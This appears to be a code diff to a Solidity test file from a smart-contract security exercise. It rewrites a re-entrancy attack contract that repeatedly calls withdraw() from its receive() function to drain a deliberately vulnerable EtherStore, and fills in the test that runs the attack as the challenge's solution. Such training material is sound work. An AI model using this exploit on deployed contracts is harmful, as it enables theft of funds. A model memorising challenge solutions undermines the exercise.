@@ -10,30 +10,21 @@ import { EtherStore } from "../../contracts/vulnerable/ReEntrancy.sol";
  * Source:
  * https://github.com/Cyfrin/solidity-by-example.github.io/blob/f88d8ed8/contracts/src/hacks/re-entrancy/ReEntrancy.sol
  */
-contract Attack {
-    EtherStore public etherStore;
-    uint256 public constant AMOUNT = 1 ether;
+contract ReEntrancyAttack {
+    function attack(EtherStore store) external payable {
+        store.deposit{ value: msg.value }();
+        store.withdraw();
 
-    constructor(address _etherStoreAddress) {
-        etherStore = EtherStore(_etherStoreAddress);
+        payable(msg.sender).transfer(address(this).balance);
     }
 
-    // Fallback is called when EtherStore sends Ether to this contract.
-    fallback() external payable {
-        if (address(etherStore).balance >= AMOUNT) {
-            etherStore.withdraw();
+    receive() external payable {
+        uint256 storeBalance = address(msg.sender).balance;
+        uint256 withdrawAmount = EtherStore(msg.sender).balances(address(this));
+
+        if (storeBalance >= withdrawAmount) {
+            EtherStore(msg.sender).withdraw();
         }
-    }
-
-    function attack() external payable {
-        require(msg.value >= AMOUNT);
-        etherStore.deposit{ value: AMOUNT }();
-        etherStore.withdraw();
-    }
-
-    // Helper function to check the balance of this contract
-    function getBalance() public view returns (uint256) {
-        return address(this).balance;
     }
 }
 
@@ -66,7 +57,8 @@ contract EtherStoreReEntrant is Test {
     }
 
     function test_reentrancy() external checkSolvedByPlayer {
-        vm.skip(true); // TODO
+        ReEntrancyAttack reEntrancy = new ReEntrancyAttack();
+        reEntrancy.attack{ value: INITIAL_BALANCE }(store);
     }
 
     function _isSolved() internal view {
